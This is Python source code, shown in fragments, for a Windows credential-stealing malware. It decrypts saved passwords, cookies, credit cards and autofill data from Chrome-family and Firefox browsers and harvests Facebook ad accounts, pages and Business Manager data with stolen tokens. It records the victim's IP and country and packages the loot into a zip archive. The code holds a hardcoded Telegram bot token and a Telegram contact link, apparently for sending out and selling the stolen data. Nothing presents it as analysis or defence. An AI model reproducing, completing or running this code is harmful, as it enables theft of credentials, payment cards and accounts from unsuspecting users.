...
from ctypes import WINFUNCTYPE, byref, pointer, windll
from ctypes.wintypes import DWORD, LPCWSTR, UINT, WCHAR
...
ImportantKeywords = ['paypal', 'perfectmoney', 'etsy', 'facebook', 'ebay', 'coin', 'binance', 'wallet', 'payment', 'amazon', 'crypto', 'business', 'server', 'instagram', 'rdp', 'blockchain', 'vpn', 'google', 'roblox', 'host', 'cloud', 'houbi', 'hbo', 'spotfiy', 'twitch', 'steam', 'reddit', 'twitter', 'instagram', 'prime', 'subgiare', 'netflix', 'garena', 'riotgames',
                     'clone', 'via', 'nguyenlieu', 'otp', 'sim', 'smit', 'proxy', 'mail', 'traodoisub', 'tuongtaccheo', 'bysun', 'mmo', 'tool', 'bm', 'tkqc', 'tainguyen', 'thesieure', 'sms', 'captcha', 'bank', 'money', 'hosting', 'tenten', 'domain', 'linkedin', 'tiktok', 'snapchat', 'pinterest', 'venmo', 'skrill', 'payoneer', 'westernunion', 'cashapp', 'zelle', 'bitcoin', 'ethereum', 'dongvan']
...
TOKEN_BOT = "7270761070:AAFsOTLX5no2ZUYy61ACwLYNEuxlezEYjUU"
...
def get_ch_master_key(path):
    ...
    try:
        ...
        ch_master_key = base64.b64decode(
            local_state["os_crypt"]["encrypted_key"])
        ch_master_key = ch_master_key[5:]
        ch_master_key = CryptUnprotectData(
            ch_master_key, None, None, None, 0)[1]
...
def decrypt_ch_value(buff, ch_master_key=None):
    try:
        ...
        if starts == "v10" or starts == "v11":
            iv = buff[3:15]
            payload = buff[15:]
            if ch_master_key is None:
                return None
            cipher = AES.new(bytes(ch_master_key), AES.MODE_GCM, iv)
...
def decrypt3DES(global_salt, master_password, entry_salt, encrypted_data):
...
def getKey(directory: Path, master_password=""):
    dbfile: Path = directory.joinpath("key4.db")
    ...
    try:
        ...
        cipher_text = decoded_item2[1].asOctets()
    ...
    try:
        ...
        raise sqlite3.DatabaseError("gecko database broken")
    if encryption_method == 'AES':
        ...
        oid = decoded_a11[0][0].asTuple()
        assert oid == (1, 2, 840, 113_549, 1, 12, 5, 1,
                       3), f"idk key to format {oid}"
        entry_salt = decoded_a11[0][1][0].asOctets()
        cipher_text = decoded_a11[1].asOctets()
        key = decrypt3DES(global_salt, master_password,
...
class Facebook():
    ...
    def get_market(self):
        try:
            ...
            idx = x[1].split('&')[0]
            list_token = self.rq.get(
                f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&breakdown_regrouping=1&nav_source=no_referrer')
    ...
    def get_info_tkqc(self):
        list_tikqc = self.rq.get(
            f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={self.token}")
        data = ""
        data += f"Tổng Số TKQC: {str(len(list_tikqc.json()['data']))}\n"
        for item in list_tikqc.json()['data']:
            xitem = item["id"]
            x = self.rq.get(
                f"https://graph.facebook.com/v16.0/{xitem}/?fields=spend_cap,balance,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,created_time,all_payment_methods%7Bpm_credit_card%7Bdisplay_string%2Cis_verified%7D%7D&access_token={self.token}")
            try:
            ...
            if int(statut) == 1:
                ...
                stt = "DIE"
            try:
                credit_card_data = x.json(
                )["all_payment_methods"]["pm_credit_card"]["data"]
            ...
            try:
                nguong_no = "{:.2f}".format(
                    float(x.json()["adspaymentcycle"]["data"][0]["threshold_amount"]) / 100)
            except Exception:
                nguong_no = "0"
    ...
    def get_page(self):
        data = self.rq.get(
            f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name%2Clink%2Cfan_count%2Cfollowers_count%2Cverification_status&access_token={self.token}")
    ...
    def get_qtv_group(self):
        list_group = self.rq.get(
            f"https://graph.facebook.com/v17.0/me/groups?fields=administrator&access_token={self.token}").text
        ...
        for item in data["data"]:
            if item["administrator"]:
                ...
                group_id = item["id"]
                ids += f"- https://www.facebook.com/groups/{group_id}\n"
        if not ids:
    ...
    def get_id_bm(self):
        data = self.rq.get(
            f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={self.token}")
        try:
    ...
    def check_slot_bm(self, idbm):
        ...
        data = {'__user': self.uid, '__a': '1', '__req': '6', '__hs': '19577.BP:brands_pkg.2.0..0.0', 'dpr': '1', '__ccg': 'EXCELLENT', '__rev': spin_r, '__s': 'vio2ve:9w2u8u:bushdg', '__hsi': hsi,
                '__dyn': '7xeUmxa2C5rgydwn8K2abBWqxu59o9E4a2i5VEdpE6C4UKegdp98Sm4Euxa1twKzobo9E7C1FxG9xedz8hwgo5S3a4EuCwQwCxq1zwCCwjFEK3idwOQ17m3Sbwgo7y78abwEwk89oeUa8fGxnzoO1WwamcwgECu7E422a3Fe6rwnVUao9k2C4oW18wRwEwiUmwnHxJxK48GU8EhAy88rwzzXx-ewjovCxeq4o884O1fwQzUS2W2K4E5yeDyU52dCgqw-z8c8-5aDBwEBwKG13y85i4oKqbDyo-2-qaUK2e0UFU2RwrU6CiU9E4KeCK2q1pwjouwg8a85Ou', '__csr': '', 'fb_dtsg': fb_dtsg, 'jazoest': jazoest, 'lsd': 'rLFRv1HDaMzv8jQKSvvUya', '__bid': idbm, '__spin_r': spin_r, '__spin_b': 'trunk', '__spin_t': spin_t, '__jssesw': '1', }
        check = self.rq.post(
...
def unlock_cookies(cookies_path):
    ...
    if result != ERROR_SUCCESS:
        raise RuntimeError(
            f"RmStartSession returned non-zero result: {result}")

    try:
        result = DWORD(rstrtmgr.RmRegisterResources(session_handle, 1, byref(
            pointer(LPCWSTR(cookies_path))), 0, None, 0, None)).value
        ...
        result = DWORD(rstrtmgr.RmGetList(session_handle, byref(
            proc_info_needed), byref(proc_info), None, byref(reboot_reasons))).value

        if result not in (ERROR_SUCCESS, ERROR_MORE_DATA):
            raise RuntimeError(
                f"RmGetList returned non-successful result: {result}")
        ...
        if result != ERROR_SUCCESS:
            raise RuntimeError(
                f"RmEndSession returned non-successful result: {result}")
...
def save_gck_login_data(profiles, profile_name, browser_name):
    ...
    for profile in profiles:
        try:
            ...
            for row in json_logins["logins"]:
                ...
                logins.append((row["hostname"], decode_login_data(
                    getKey(profile), enc_username), decode_login_data(getKey(profile), enc_password)))
    ...
    if count > 0:
        if not os.path.exists(data_path):
            os.makedirs(data_path)
        logins_file = os.path.join(data_path, "All_Passwords.txt")
...
def get_gck_profiles(basepath):
    try:
        ...
        with open(profiles_path, "r") as f:
            data = f.read()
        profiles = [
            os.path.join(basepath.encode("utf-8"), p.strip()
                         [5:].encode("utf-8")).decode("utf-8")
...
def get_ch_login_data(browser, path, profile, ch_master_key):
    ...
    if not os.path.exists(f"{path}\\{profile}\\Login Data"):
        return count
    shutil.copy(f"{path}\\{profile}\\Login Data",
                os.path.join(TMP if TMP else os.getcwd(), "login_db"))
    conn = sqlite3.connect(os.path.join(
        TMP if TMP else os.getcwd(), "login_db"))
    cursor = conn.cursor()
    try:
        cursor.execute(
    ...
    if count > 0:
        if not os.path.exists(data_path):
            os.makedirs(data_path)
        pw_file = os.path.join(data_path, "All_Passwords.txt")
        with open(pw_file, "a", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(os.path.join(TMP if TMP else os.getcwd(), "login_db"))
    return count
...
def get_ch_cookies(browser, path, profile, ch_master_key):
    ...
    if browser in ["Chrome", "Chrome SxS", "Chrome (x86)"]:
        while True:
            try:
                subprocess.run(
                    ["taskkill", "/F", "/IM", "chrome.exe"], creationflags=0x08000000)
                ...
                ws_url = requests.get(
                    "http://localhost:9222/json").json()[0]['webSocketDebuggerUrl']
        ...
        while True:
            try:
                shutil.copy(os.path.join(path, profile, "Network",
                            "Cookies"), os.path.join(TMP if TMP else os.getcwd(), "cookie_db"))
                break
            except Exception:
                try:
                    unlock_cookies(os.path.join(
        ...
        try:
            conn = sqlite3.connect(os.path.join(
                TMP if TMP else os.getcwd(), "cookie_db"))
            cursor = conn.cursor()
            ...
            for host, name, path_cookies, value, expires_utc, is_secure, is_http_only in cursor.fetchall():
                ...
                try:
                    ...
                    cookie = decrypt_ch_value(value, ch_master_key[-61:])
            ...
            if count > 0:
                ...
                with open(cc_file, "w", encoding="utf-8") as f:
                    f.writelines(result)
            conn.close()
            os.remove(os.path.join(TMP if TMP else os.getcwd(), "cookie_db"))
        except Exception:
            pass
    return count
...
def save_gck_cookies(profiles, profile_name, browser_name):
    ...
    try:
        conn = sqlite3.connect(
            f"file:{os.path.join(profiles[0], 'cookies.sqlite')}?mode=ro", uri=True)
        cursor = conn.cursor()
    ...
    for profile in profiles:
        ...
        for cookie in cookies:
            ...
            cookies_data.append(
                f"{host}\t{secure_str}\t{path}\t{httponly_str}\t{expiry}\t{name}\t{value}\n")
            if host == ".facebook.com":
...
def get_ch_ccards(browser, path, profile, ch_master_key):
    ...
    if not os.path.exists(f"{path}\\{profile}\\Web Data"):
        return count
    shutil.copy(f"{path}\\{profile}\\Web Data", os.path.join(
        TMP if TMP else os.getcwd(), "cards_db"))
    conn = sqlite3.connect(os.path.join(
        TMP if TMP else os.getcwd(), "cards_db"))
    cursor = conn.cursor()
    ...
    if count > 0:
        ...
        with open(cc_file, "w", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(os.path.join(TMP if TMP else os.getcwd(), "cards_db"))
    return count
...
def get_ch_autofill(browser, path, profile):
    ...
    if not os.path.exists(f"{path}\\{profile}\\Web Data"):
        return count
    shutil.copy(f"{path}\\{profile}\\Web Data", os.path.join(
        TMP if TMP else os.getcwd(), "autofill_db"))
    conn = sqlite3.connect(os.path.join(
        TMP if TMP else os.getcwd(), "autofill_db"))
    cursor = conn.cursor()
    ...
    if count > 0:
        ...
        with open(autofills_file, "w", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(os.path.join(TMP if TMP else os.getcwd(), "autofill_db"))
    return count
...
for browser in available_path:
    ...
    if not glob.glob(os.path.join(browser_path, "Profile*")):
        ...
        profile_folders = [os.path.join(
            browser_path, "Default")] + glob.glob(os.path.join(browser_path, "Profile*"))

    for profile_folder in profile_folders:
        profile = "" if browser in [
            "Opera", "Opera GX"] else os.path.basename(profile_folder)

        countP = get_ch_login_data(
            browser, browser_path, profile, ch_master_key)
...
for browser, profiles in gck_browser_profiles.items():
    for profile in profiles:
        ...
        total_gck_logins_count += sum(logins_count) if isinstance(
            logins_count, list) else logins_count
...
def get_ip():
    try:
        ...
        SEIP = i_data["query"]
        country_code = i_data["countryCode"]
        country_name = i_data["country"]
        get_ipd = f"IP: {SEIP}\nCountry: {country_code} - {country_name}"
    except Exception:
        get_ipd = "IP: N/A"
        country_code = "Unknown"
        SEIP = "Unknown"
    return get_ipd, country_code, SEIP
...
GetIPD, CountryCode, SEIP = get_ip()
Count = counter()

zip_data = io.BytesIO()

archive_path = os.path.join(
    TMP if TMP else os.getcwd(), f"[{CountryCode}_{SEIP}] {os.getenv('COMPUTERNAME', 'defaultValue')}.zip")

with zipfile.ZipFile(zip_data, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
    zip_file.comment = f"Time Created: {creation_datetime}\nContact: https://t.me/ovftank".encode()
